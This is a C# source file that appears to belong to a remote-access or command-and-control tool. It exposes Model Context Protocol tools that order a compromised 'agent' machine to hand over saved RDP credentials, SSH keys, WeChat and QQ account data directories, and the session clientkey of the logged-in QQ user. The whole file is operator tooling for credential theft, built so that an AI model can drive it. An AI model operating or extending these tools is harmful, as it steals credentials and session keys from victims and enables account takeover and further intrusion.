using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Mcp;

/// <summary>Credential-focused tools: RDP, SSH keys, QQ/WeChat accounts.</summary>
[McpServerToolType]
public sealed class CredTools
{
    [McpServerTool, Description("Collect saved RDP credentials (Credential Manager + .rdp files) from an agent")]
    public static async Task<string> get_rdp_credentials(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.rdp", null, TimeSpan.FromSeconds(45));
    }

    [McpServerTool, Description("Collect SSH keys from an agent (~/.ssh)")]
    public static async Task<string> get_ssh_keys(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.ssh", null, TimeSpan.FromSeconds(30));
    }

    [McpServerTool, Description("List WeChat account data directories on an agent")]
    public static async Task<string> get_wechat_data(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.wechat", null, TimeSpan.FromSeconds(30));
    }

    [McpServerTool, Description("List QQ account data directories on an agent")]
    public static async Task<string> get_qq_data(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.qq", null, TimeSpan.FromSeconds(30));
    }

    [McpServerTool, Description("Extract the session key (clientkey) of the currently logged-in QQ on an agent")]
    public static async Task<string> get_qq_clientkey(
        RelayService relay,
        AgentService agents,
        [Description("Target agent ID")] string agentId)
    {
        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.qq_clientkey", null, TimeSpan.FromSeconds(120));
    }
}